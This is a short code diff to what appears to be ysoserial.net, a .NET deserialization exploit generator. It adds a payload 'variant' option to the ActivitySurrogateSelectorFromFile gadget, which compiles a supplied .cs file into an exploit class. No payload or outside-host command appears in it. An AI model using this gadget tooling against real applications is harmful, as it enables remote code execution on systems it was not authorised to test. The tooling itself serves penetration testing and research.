@@ -1,4 +1,5 @@
-﻿using System;
+﻿using NDesk.Options;
+using System;
 using System.CodeDom.Compiler;
 using System.IO;
 using System.Linq;
@@ -14,8 +15,10 @@ namespace ysoserial.Generators
         {
         }
 
-        public PayloadClassFromFile(string file)
+        public PayloadClassFromFile(string file, int variant_number, InputArgs inputArgs)
         {
+            this.variant_number = variant_number;
+            this.inputArgs = inputArgs;
             string[] files = file.Split(new[] { ';' }).Select(s => s.Trim()).ToArray();
             CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
             CompilerParameters compilerParameters = new CompilerParameters();
@@ -37,6 +40,17 @@ namespace ysoserial.Generators
 
     public class ActivitySurrogateSelectorFromFileGenerator : ActivitySurrogateSelectorGenerator
     {
+        private int variant_number = 1;
+
+        public override OptionSet Options()
+        {
+            OptionSet options = new OptionSet()
+            {
+                {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2 (shorter but may not work between versions)", v => int.TryParse(v, out this.variant_number) },
+            };
+            return options;
+        }
+
         public override string AdditionalInfo()
         {
             return "Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'";
@@ -51,7 +65,7 @@ namespace ysoserial.Generators
         {
             try
             {
-                PayloadClassFromFile payload = new PayloadClassFromFile(inputArgs.Cmd);
+                PayloadClassFromFile payload = new PayloadClassFromFile(inputArgs.Cmd, variant_number, inputArgs);
                 return Serialize(payload, formatter, inputArgs);
             }
             catch(System.IO.FileNotFoundException e1)
